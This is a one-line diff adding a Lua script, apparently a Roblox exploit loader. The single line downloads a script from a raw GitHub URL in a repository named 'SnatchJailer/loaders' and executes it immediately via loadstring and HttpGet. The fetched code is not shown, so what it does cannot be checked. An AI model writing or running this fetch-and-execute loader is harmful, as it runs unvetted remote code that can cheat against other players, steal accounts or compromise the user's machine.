@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/kukirin-life-testing-spam1-zcujic2ok54i57.lua"))()
